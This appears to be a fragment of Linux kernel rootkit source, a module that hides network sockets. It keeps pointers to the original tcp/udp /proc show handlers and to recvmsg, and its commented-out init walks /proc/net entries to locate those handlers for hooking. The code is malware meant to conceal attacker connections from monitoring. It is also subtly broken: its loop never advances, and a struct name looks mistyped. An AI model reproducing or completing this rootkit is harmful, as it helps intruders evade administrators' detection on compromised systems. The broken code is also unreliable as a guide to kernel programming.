#include "utils.h"
#include "socket_hiding.h"

/* counters for access */
static int acc_recvmsg = 0;
static int acc_tcp4 = 0;
static int acc_tcp6 = 0;
static int acc_udp4 = 0;
static int acc_udp6 = 0;

/* mutexes for counters */
struct mutex lck_recvmsg;
struct mutex lck_tcp4;
struct mutex lck_tcp6;
struct mutex lck_udp4;
struct mutex lck_udp6;

/* data nodes */
struct data_node *tcp_node = NULL;
struct data_node *tcp6_node = NULL;
struct data_node *udp_node = NULL;
struct data_node *udp6_node = NULL;

/* pointers to origin syscalls */
int (*def_tcp4_show)(struct seq_file *m, void *v);
int (*def_tcp6_show)(struct seq_file *m, void *v);
int (*def_udp4_show)(struct seq_file *m, void *v);
int (*def_udp6_show)(struct seq_file *m, void *v);

asmlinkage ssize_t (*def_recvmsg)(int sockfd,
								  struct user_ssghdr __user *msg, int flags);

/* int s_hiding_init(void) */
/* { */
/*   /\* struct for all entries in /proc/<pid>/net *\/ */
/*   struct proc_dir_entry *proc_current; */

/*   /\* temporary pointers to data *\/ */
/*   struct tcp_seq_afinfo *tcp_data; */
/*   struct udp_seq_afinfo *udp_data; */

/*   /\* rb structs for iterating through /proc entries *\/ */
/*   struct rb_root *root = &init_net.proc_net->subdir; */
/*   struct rb_node *proc_node_current = rb_first(root); */
/*   struct rb_node *proc_node_last = rb_last(root); */

/*   /\* initialize mutexes *\/ */
/*   mutex_init(&lck_recvmsg); */
/*   mutex_init(&lck_tcp4); */
/*   mutex_init(&lck_tcp6); */
/*   mutex_init(&lck_udp4); */
/*   mutex_init(&lck_udp6); */

/*   while (proc_node_current != proc_node_last) { */

/* 	proc_current = rb_entry(proc_node_current, struct proc_dir_entry, subdir_node); */

/* 	if (!strcmp(proc_current->name, "tcp")) { */
/* 	  tcp_data = proc_current->data; */
/* 	  //proc_current->seq_ops->show = def_tcp4_show; */
/* 	} */
/* 	if (!strcmp(proc_current->name, "tcp6")) { */
/* 	  tcp_data = proc_current->data; */
/* 	  //proc_current->seq_ops->show = def_tcp6_show; */
/* 	} */
	
/*   } */
/* } */
